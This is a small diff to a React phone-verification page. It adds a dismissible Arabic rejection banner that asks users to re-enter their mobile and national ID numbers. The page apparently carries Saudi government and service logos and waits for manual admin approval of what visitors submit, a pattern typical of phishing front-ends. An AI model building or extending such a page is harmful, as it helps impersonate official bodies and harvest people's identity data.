@@ -7,6 +7,7 @@ import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval"
 import { toast } from "sonner";
 import { linkVisitorToSession } from "@/lib/visitorLink";
 import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
+import RejectionBanner from "@/components/RejectionBanner";
 import wtheqLogo from "@/assets/wtheq-logo.png";
 import cstLogo from "@/assets/cst-logo.png";
 import nicLogo from "@/assets/nic-logo.png";
@@ -36,6 +37,7 @@ const PhoneVerification = () => {
   const [showCarriers, setShowCarriers] = useState(false);
   const [loading, setLoading] = useState(false);
   const [waitingApproval, setWaitingApproval] = useState(false);
+  const [rejected, setRejected] = useState(false);
   const [orderId, setOrderId] = useState<string | null>(passedOrderId);
   const [phoneError, setPhoneError] = useState("");
   const [idError, setIdError] = useState("");
@@ -52,6 +54,7 @@ const PhoneVerification = () => {
       toast.error(pv.verificationRejected);
       setWaitingApproval(false);
       setLoading(false);
+      setRejected(true);
     }
   }, [approvalStatus, orderId, navigate, offer, phone, carrier]);
 
@@ -107,6 +110,11 @@ const PhoneVerification = () => {
           />
         ) : (
           <>
+            <RejectionBanner
+              show={rejected}
+              message="تم رفض التحقق لعدم تطابق البيانات. يرجى التأكد من رقم الجوال ورقم الهوية الوطنية ثم إعادة المحاولة."
+              onDismiss={() => setRejected(false)}
+            />
             {showError && (
               <motion.div initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} className="flex items-start gap-2 bg-destructive/10 border border-destructive/20 rounded-lg p-3">
                 <AlertTriangle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
